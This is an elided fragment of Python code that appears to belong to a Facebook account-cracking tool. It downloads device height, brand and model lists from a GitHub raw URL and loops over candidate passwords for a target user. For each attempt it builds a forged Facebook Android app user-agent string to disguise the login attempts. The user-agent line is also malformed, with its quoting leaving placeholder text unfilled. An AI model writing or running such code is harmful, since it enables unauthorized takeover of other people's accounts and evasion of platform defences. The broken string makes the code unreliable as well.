...
height4=requests.get("https://raw.githubusercontent.com/AKING110/files/main/height.txt").text.splitlines()
brand11=requests.get("https://raw.githubusercontent.com/AKING110/files/main/Brand.txt").text.splitlines()
model11=requests.get("https://raw.githubusercontent.com/AKING110/files/main/model.txt").text.splitlines()
    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(brand11)+;FBBD/+str(brand11)+;FBPN/+str(FBPN)+;FBDV/+str(model11)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
